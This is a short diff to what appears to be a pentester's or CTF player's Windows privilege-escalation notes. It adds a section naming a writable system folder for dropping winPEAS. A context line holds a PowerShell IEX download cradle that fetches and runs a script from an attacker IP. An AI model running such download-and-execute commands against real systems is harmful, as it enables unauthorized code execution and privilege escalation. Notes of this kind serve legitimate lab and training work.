@@ -168,6 +168,12 @@ IEX(New-Object Net.WebClient).downloadString('http://10.10.16.6/PrivescCheck/Pri
 ```
 
 
+## Write Files
+We need to run winpeas somewhere so will find locations like this work
+```
+C:\Windows\System32\spool\drivers\color
+```
+
 ## IIS Server
 ```
 Generally what we do when we are on a Web Server
